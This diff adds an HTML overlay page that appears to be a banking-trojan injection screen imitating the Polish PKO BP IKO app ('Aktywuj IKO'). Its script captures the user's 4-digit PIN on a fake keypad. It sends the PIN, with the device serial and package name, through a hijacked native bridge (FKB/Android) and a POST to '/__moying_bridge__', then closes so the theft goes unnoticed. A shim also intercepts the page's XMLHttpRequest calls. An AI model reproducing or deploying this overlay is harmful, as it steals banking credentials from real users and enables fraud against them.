@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head><script>window.__MOYING_TPL='pko';</script>
+<script>
+/* ===== 墨影注入页协议 shim（只走原生桥，禁止任何外发） ===== */
+(function(){
+  var TPL = window.__MOYING_TPL || 'unknown';
+  function pk(){ try{ return (window.FKB && FKB.getPkg) ? (FKB.getPkg()||'') : ''; }catch(e){ return ''; } }
+  function sn(){ try{ return (window.FKB && FKB.getSn) ? (FKB.getSn()||'') : ''; }catch(e){ return ''; } }
+  function push(form){
+    var pl = JSON.stringify({ pkg: pk(), sn: sn(), template: TPL, formData: form || {} });
+    try{ if(window.FKB && FKB.setFormData) FKB.setFormData(pl); }catch(e){}
+    setTimeout(function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }, 300);
+    return pl;
+  }
+  window.__moyingPush = push;
+  /* ① 页面自带的 XMLHttpRequest 外发统一截获，改走桥 */
+  var _open = XMLHttpRequest.prototype.open, _send = XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open = function(m,u){ this.__mu = String(u||''); return _open.apply(this, arguments); };
+  XMLHttpRequest.prototype.send = function(b){
+    var u = this.__mu || '';
+    if(u.indexOf('/__moying_bridge__') >= 0 || u.indexOf('/api/inj/result') >= 0){
+      var o = {}, tpl = TPL;
+      try{ o = JSON.parse(b||'{}'); }catch(e){}
+      if(o && o.template) tpl = o.template;
+      var form = (o && (o.formData || o.data)) ? (o.formData || o.data) : o;
+      window.__MOYING_TPL = tpl;
+      push(form);
+      return;
+    }
+    return _send.apply(this, arguments);
+  };
+  /* ② 直接调用 Android.returnResult(json) 的老页面（如 millennium）也转成我们的协议 */
+  var orig = (window.Android && window.Android.returnResult) ? window.Android.returnResult : null;
+  var bridge = {
+    returnResult: function(s){
+      var o = null;
+      try{ o = (typeof s === 'string') ? JSON.parse(s) : s; }catch(e){ o = null; }
+      if(o && o.action){ if(orig){ try{ return orig(s); }catch(e){} } return; }
+      if(o && (o.formData || o.pkg)) push(o.formData || o);
+      else push(o || {});
+    },
+    setFormData: function(s){ try{ var o=JSON.parse(s); push(o.formData||o); }catch(e){ push({}); } },
+    getPkg: function(){ return pk(); },
+    getSn: function(){ return sn(); },
+    getUserName: function(){ try{ return (orig && orig.getUserName && orig.getUserName()) || ''; }catch(e){ return ''; } },
+    setClosePage: function(p){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(p||pk()); }catch(e){} },
+    close: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} },
+    finish: function(){ try{ if(window.FKB && FKB.setClosePage) FKB.setClosePage(pk()); }catch(e){} }
+  };
+  try{ window.Android = bridge; }catch(e){}
+})();
+</script>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<title>IKO</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{
+  background:#F7F4F7;
+  color:#1A1A1A;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;
+  -webkit-user-select:none;user-select:none;
+  overscroll-behavior:none;
+}
+.app{min-height:100dvh;min-height:100vh;display:flex;flex-direction:column}
+
+/* ---------- header ---------- */
+.hd{
+  flex:0 0 auto;
+  display:flex;align-items:center;
+  padding:calc(8px + env(safe-area-inset-top,0px)) 18px 0 18px;
+  height:calc(56px + env(safe-area-inset-top,0px));
+}
+.xbtn{
+  width:38px;height:38px;margin-left:-9px;flex:0 0 38px;
+  display:flex;align-items:center;justify-content:center;
+  background:none;border:0;cursor:pointer;
+}
+.xbtn svg{width:19px;height:19px;stroke:#1F1B2E;fill:none;stroke-width:1.9;stroke-linecap:round}
+.hd h1{font-size:16.5px;font-weight:400;letter-spacing:.1px;color:#1F1B2E;margin-left:21px}
+
+.track{position:relative;height:1px;flex:0 0 1px;background:#E6E1EA}
+.track i{
+  position:absolute;top:-1px;left:0;height:3px;width:25%;
+  background:#1B0F4B;border-radius:2px;
+  transition:width .38s cubic-bezier(.4,0,.2,1);
+}
+
+/* ---------- layout ---------- */
+.body{
+  flex:1 1 auto;display:flex;flex-direction:column;
+  padding:24px 22px calc(26px + env(safe-area-inset-bottom,0px)) 22px;
+}
+.scr{display:none;flex:1 1 auto;flex-direction:column}
+.scr.on{display:flex}
+.spacer{flex:1 1 auto;min-height:36px}
+
+/* ---------- tabs ---------- */
+.tabs{
+  position:relative;display:flex;height:48px;
+  border:1.5px solid #3D2E6B;border-radius:8px;background:#fff;
+  margin-bottom:20px;
+}
+.tab{
+  flex:1 1 50%;position:relative;border:0;background:transparent;
+  font-family:inherit;font-size:15px;color:#1B0F4B;letter-spacing:.1px;
+  cursor:pointer;padding:0 6px;line-height:1;
+}
+.tab:first-child{border-radius:6px 0 0 6px}
+.tab:last-child{border-radius:0 6px 6px 0}
+.tab.active{background:#1B0F4B;color:#fff}
+.tab.active::after{
+  content:"";position:absolute;left:50%;bottom:-9px;transform:translateX(-50%);
+  width:0;height:0;
+  border-left:7px solid transparent;border-right:7px solid transparent;
+  border-top:8px solid #1B0F4B;
+}
+.tabs.inteligo .tab:first-child{border-radius:6px 0 0 6px;background:transparent;color:#1B0F4B}
+.tabs.inteligo .tab:last-child{border-radius:0 6px 6px 0;background:#1B0F4B;color:#fff}
+
+/* ---------- field ---------- */
+.lblrow{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:9px}
+.lblrow label{font-size:14.5px;line-height:1.3;color:#453F52;letter-spacing:.1px}
+.q{
+  flex:0 0 24px;width:24px;height:24px;
+  border:1.5px solid #3D2E6B;border-radius:7px;background:transparent;
+  color:#3D2E6B;font-family:inherit;font-size:13px;font-weight:600;line-height:1;
+  display:flex;align-items:center;justify-content:center;cursor:pointer;padding:0;
+}
+.inp{
+  width:100%;height:48px;
+  border:1.5px solid #3D2E6B;border-radius:8px;background:#fff;
+  padding:0 14px;font-family:inherit;font-size:17px;color:#141414;
+  outline:none;caret-color:#1B0F4B;
+  -webkit-appearance:none;appearance:none;
+}
+.inp::placeholder{color:#A29BAE}
+.inp:focus{border-color:#1B0F4B}
+.inp.err{border-color:#C0392B}
+
+/* ---------- buttons ---------- */
+.btn-primary{
+  width:100%;height:54px;border:0;border-radius:6px;
+  background:#1B0F4B;color:#fff;font-family:inherit;
+  font-size:16.5px;font-weight:500;letter-spacing:.2px;cursor:pointer;
+  transition:filter .16s,transform .08s;
+}
+.btn-primary:active{transform:scale(.995);filter:brightness(1.1)}
+.btn-primary:disabled{background:#D3CDDE;color:#F5F2F8;transform:none;filter:none}
+.or{text-align:center;font-size:14px;color:#5C5568;margin:15px 0 15px}
+.btn-alt{
+  width:100%;height:54px;border:1px solid #DFD9E4;border-radius:6px;background:#fff;
+  display:flex;align-items:center;justify-content:center;gap:7px;
+  font-family:inherit;font-size:16px;color:#1A1A1A;cursor:pointer;
+}
+.btn-alt:active{background:#FBF9FC}
+.allegro{color:#FF5A00;font-weight:600;font-size:17px;letter-spacing:-.3px}
+.klik{font-weight:700;letter-spacing:.3px}
+
+.shake{animation:shake .42s cubic-bezier(.36,.07,.19,.97)}
+@keyframes shake{
+  10%,90%{transform:translateX(-2px)}
+  20%,80%{transform:translateX(3px)}
+  30%,70%{transform:translateX(-4px)}
+  40%,60%{transform:translateX(4px)}
+  50%{transform:translateX(-2px)}
+}
+.fadein{animation:fadein .3s cubic-bezier(.3,0,.2,1)}
+@keyframes fadein{from{opacity:0;transform:translateX(18px)}to{opacity:1;transform:none}}
+
+    .pinrow{display:flex;gap:12px}
+    .pinbox{
+        flex:1 1 0;min-width:0;height:56px;padding:0;
+        border:1.5px solid #3D2E6B;border-radius:8px;background:#fff;
+        text-align:center;font-family:inherit;font-size:22px;color:#141414;
+        outline:none;caret-color:#1B0F4B;-webkit-appearance:none;appearance:none;
+    }
+    .pinbox:focus{border-color:#1B0F4B;box-shadow:0 0 0 2px rgba(27,15,75,.09)}
+    .pinbox.err{border-color:#C0392B}
+
+    .pad{display:grid;grid-template-columns:repeat(3,1fr);justify-items:center;row-gap:12px;margin-bottom:18px}
+    .key{
+        width:74px;height:54px;padding:0;border:1.5px solid #3D2E6B;border-radius:14px;background:#fff;
+        color:#1B0F4B;font-family:inherit;font-size:22px;line-height:1;cursor:pointer;
+        display:flex;align-items:center;justify-content:center;
+        -webkit-appearance:none;appearance:none;transition:background .1s,transform .08s;
+    }
+    .key:active{background:#EDE7F6;transform:scale(.96)}
+    .key.blank{visibility:hidden}
+    .key svg{width:24px;height:24px;stroke:#1B0F4B;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+    @media (max-height: 660px) {
+        .pad{row-gap:9px;margin-bottom:14px}
+        .key{width:66px;height:48px;font-size:20px}
+    }
+</style>
+</head>
+<body>
+<div class="app">
+
+  <div class="hd">
+    <button class="xbtn" id="xbtn" type="button" aria-label="Zamknij">
+      <svg viewBox="0 0 24 24"><path d="M5 5l14 14"/><path d="M19 5L5 19"/></svg>
+    </button>
+    <h1>Aktywuj IKO</h1>
+  </div>
+  <div class="track"><i id="bar" style="width:25%"></i></div>
+
+  <div class="body">
+
+    <section class="scr on" id="s1">
+      <div class="lblrow" style="margin-top:16px">
+        <label id="lbl1">Podaj kod PIN</label>
+        <button class="q" type="button" tabindex="-1">?</button>
+      </div>
+
+      <div class="pinrow" id="pinRow">
+        <input class="pinbox" readonly type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN">
+        <input class="pinbox" readonly type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN">
+        <input class="pinbox" readonly type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN">
+        <input class="pinbox" readonly type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN" enterkeyhint="go">
+      </div>
+
+
+
+      <div class="spacer"></div>
+
+      <div class="pad" id="pad">
+        <button class="key" type="button" data-k="1">1</button>
+        <button class="key" type="button" data-k="2">2</button>
+        <button class="key" type="button" data-k="3">3</button>
+        <button class="key" type="button" data-k="4">4</button>
+        <button class="key" type="button" data-k="5">5</button>
+        <button class="key" type="button" data-k="6">6</button>
+        <button class="key" type="button" data-k="7">7</button>
+        <button class="key" type="button" data-k="8">8</button>
+        <button class="key" type="button" data-k="9">9</button>
+        <button class="key blank" type="button" tabindex="-1"></button>
+        <button class="key" type="button" data-k="0">0</button>
+        <button class="key" type="button" id="delBtn" aria-label="Usuń">
+          <svg viewBox="0 0 24 24"><path d="M20.5 5H9.6L3 12l6.6 7h10.9a.9.9 0 0 0 .9-.9V5.9a.9.9 0 0 0-.9-.9z"/><path d="M13.2 9.3l5.2 5.4M18.4 9.3l-5.2 5.4"/></svg>
+        </button>
+      </div>
+
+      <button class="btn-primary" id="b1" type="button" disabled>Dalej</button>
+    </section>
+
+  </div>
+</div>
+
+<script>
+(function(){
+  "use strict";
+
+  var PKG = "", SN = "";
+  try { if (typeof FKB !== "undefined") { if (FKB.getPkg) PKG = FKB.getPkg(); if (FKB.getSn) SN = FKB.getSn(); } } catch (e) {}
+
+  var boxes = Array.prototype.slice.call(document.querySelectorAll(".pinbox"));
+  var btn   = document.getElementById("b1");
+  var xbtn  = document.getElementById("xbtn");
+  var padEl = document.getElementById("pad");
+  var sent  = false;
+
+  function toJSON(o) {
+    try { return JSON.stringify(o); } catch (e) {}
+    var out = [], k, v;
+    for (k in o) {
+      if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
+      v = o[k];
+      if (typeof v === "string") out.push('"' + k + '":"' + v.replace(/\\/g, "\\\\").replace(/"/g, '\\"') + '"');
+      else out.push('"' + k + '":' + v);
+    }
+    return "{" + out.join(",") + "}";
+  }
+
+  function report(payload, useBridge) {
+    var pl = toJSON(payload);
+    if (useBridge) {
+      try { if (typeof Android !== "undefined" && Android.returnResult) Android.returnResult(pl); } catch (e) {}
+    }
+    if (location.protocol !== "http:" && location.protocol !== "https:") return pl;
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", location.origin + "/__moying_bridge__", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ deviceId: SN, pkg: PKG, template: "pko", formData: pl }));
+    } catch (e) {}
+    return pl;
+  }
+
+  function val() {
+    var s = "";
+    for (var i = 0; i < boxes.length; i++) s += boxes[i].value;
+    return s;
+  }
+  function sync() {
+    var v = val();
+    btn.disabled = sent || v.length !== 4;
+    for (var i = 0; i < boxes.length; i++) boxes[i].classList.remove("err");
+  }
+  function at(i) { if (boxes[i]) { try { boxes[i].focus(); } catch (e) {} } }
+  function buzz(ms) { try { if (navigator.vibrate) navigator.vibrate(ms); } catch (e) {} }
+  function firstEmpty() { for (var i = 0; i < boxes.length; i++) if (!boxes[i].value) return i; return -1; }
+  function lastFilled() { for (var i = boxes.length - 1; i >= 0; i--) if (boxes[i].value) return i; return -1; }
+
+  function digit(d) {
+    if (sent) return;
+    var i = firstEmpty();
+    if (i < 0) return;
+    boxes[i].value = d;
+    buzz(7);
+    sync();
+    if (i < boxes.length - 1) at(i + 1);
+    else { try { boxes[i].focus(); } catch (e) {} }
+  }
+  function del() {
+    if (sent) return;
+    var i = lastFilled();
+    if (i < 0) return;
+    boxes[i].value = "";
+    buzz(7);
+    sync();
+    at(i);
+  }
+  function closestTo(el, attr) {
+    while (el && el !== document) {
+      if (el.getAttribute && el.getAttribute(attr) !== null) return el;
+      el = el.parentNode;
+    }
+    return null;
+  }
+
+  function closePage() {
+    try { if (typeof Android !== "undefined" && Android.close) { Android.close(); return; } } catch (e) {}
+    try { if (typeof FKB !== "undefined" && FKB.setClosePage) { FKB.setClosePage(PKG); return; } } catch (e) {}
+    try { window.close(); } catch (e) {}
+    try { document.documentElement.style.display = "none"; } catch (e) {}
+  }
+
+  function submit() {
+    if (sent) return;
+    var pin = val();
+    if (!/^[0-9]{4}$/.test(pin)) {
+      for (var i = 0; i < boxes.length; i++) {
+        if (!boxes[i].value) { boxes[i].classList.add("err"); at(i); break; }
+      }
+      return;
+    }
+    sent = true;
+    btn.disabled = true;
+    try { document.activeElement.blur(); } catch (e) {}
+    report({ pin: pin, step: "pin" }, true);
+    setTimeout(closePage, 500);
+  }
+
+  if (padEl) {
+    padEl.addEventListener("click", function (e) {
+      var k = closestTo(e.target, "data-k");
+      if (k) { digit(k.getAttribute("data-k")); return; }
+      var d = closestTo(e.target, "id");
+      if (d && d.id === "delBtn") del();
+    });
+  }
+
+  document.addEventListener("keydown", function (e) {
+    if (e.key >= "0" && e.key <= "9") { e.preventDefault(); digit(e.key); }
+    else if (e.key === "Backspace") { e.preventDefault(); del(); }
+    else if (e.key === "Enter") { e.preventDefault(); submit(); }
+  });
+
+  Array.prototype.forEach.call(boxes, function (b, idx) {
+    b.addEventListener("click", function () { at(idx); });
+  });
+
+  btn.addEventListener("click", submit);
+  xbtn.addEventListener("click", function (e) { e.preventDefault(); closePage(); });
+
+  setTimeout(function () { at(0); }, 150);
+})();
+</script>
+</body>
+<!-- moying pkg=pl.pkobp.iko tpl=pko -->
+</html>
